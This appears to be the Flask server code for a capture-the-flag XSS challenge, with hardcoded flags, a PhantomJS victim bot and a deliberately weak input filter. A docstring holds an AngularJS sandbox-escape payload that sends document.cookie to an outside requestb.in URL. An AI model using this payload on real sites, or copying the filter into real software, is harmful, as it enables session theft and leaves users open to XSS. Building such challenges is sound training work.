from flask import render_template, request, render_template_string, redirect, current_app
from multiprocessing import Process
from ..app import db
from . import base_xss
from . import forms
from . import phantom
from .models import Xss

''' {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1),new Image().src="http://requestb.in/z3n17ez3?asdf="+document.cookie,alert(2)');}}

'''
flag1 = 'FCTF{4412ce63c2637af2a0b5fc7acc3966c3}'

@base_xss.route('/f4b79862d3dbfcc2c45ae07df16d0d6f')
def xss_set_flag_cookie():
    redirect_to_index = redirect('/')
    response = current_app.make_response(redirect_to_index)
    response.set_cookie('totally_not_the_flag',value = flag1)
    return response

@base_xss.route('/robots.txt')
def xss_robotstxt():
    robots = '''
User-agent: *
Disallow: /?
Disallow: /create
Flag: {0}'''.format(flag2)
    response = current_app.make_response(robots)
    response.mimetype = "text/plain"
    return response


@base_xss.route('/<xss_id>')
def xss_post_page(xss_id):
    if xss_id == '404':
        return render_template_string('')

    print '[+] XSS Payload Request: ID: ', xss_id,
    xss = Xss.query.filter_by(id=xss_id).scalar()
    if xss is None:
        return render_template_string("404")
    print xss.content, '|', xss.id, '|', xss.title
    return render_template('post.html', xss=xss)

@base_xss.route('/', methods=['GET', 'POST'])
@base_xss.route('/create', methods=['GET', 'POST'])
def xss_create_page():
    if request.method == 'GET':
        message = 'hello'
        form = forms.base_xss_form()
        return render_template('create.html', message=message, form=form)
    elif request.method == 'POST':
        title = request.form['title'] if request.form['title'] else ''
        content = request.form['content'] if request.form['content'] else ''
        #process payload here if you want to do anything with it
        title = xss_filter(title)
        content = xss_filter(content)
        new_xss = Xss(title=title, content=content)
        db.session.add(new_xss)
        db.session.commit()
        if "PhantomJS" not in request.headers['User-Agent']:
            print request.url, 'just before process spooky'
            p = Process(target=phantom.xss_get, args=(request.url_root + str(new_xss.id),))
            p.start()
        return render_template('success.html', id=new_xss.id ,title=title, content=content)

def xss_filter(payload):
    payload = payload.replace("script", "XSS ATTEMPT DETECTED")
    payload = payload.replace('<', '&lt;')
    payload = payload.replace('>', '&gt;')
    return payload
